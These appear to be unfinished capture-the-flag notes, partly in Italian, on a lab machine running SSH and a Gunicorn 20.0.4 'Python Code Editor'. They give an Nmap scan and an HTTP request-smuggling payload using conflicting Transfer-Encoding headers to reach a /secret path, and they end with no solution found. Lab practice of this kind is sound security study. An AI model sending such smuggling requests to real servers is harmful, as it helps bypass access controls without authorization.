# Code

## NMAP SCAN
Nmap scan report for 10.10.11.62
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT       ADDRESS
1   309.34 ms 10.10.16.1
2   112.86 ms 10.10.11.62

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.97 seconds


noto aperte le 2 porte 22 e 5000. cerco online cosa è Gunicorn


## web app analisi

analizzando la web app non si notano vulnerabilità lampanti (almeno ad occhio)

cercando online noto alcuni attacchi noti per Gunicorn 20.0.4 e provo a usare uno di quelli

POST /hello HTTP/1.1
Host: 172.24.10.161
Transfer-Encoding: chunked
Content-Length: 90
Transfer-Encoding: xchunked

1
a
0

GET /secret HTTP/1.1x
Host: 172.24.10.161
Content-Length: 0


# SOLUZIONE NON TROVATA ANCORA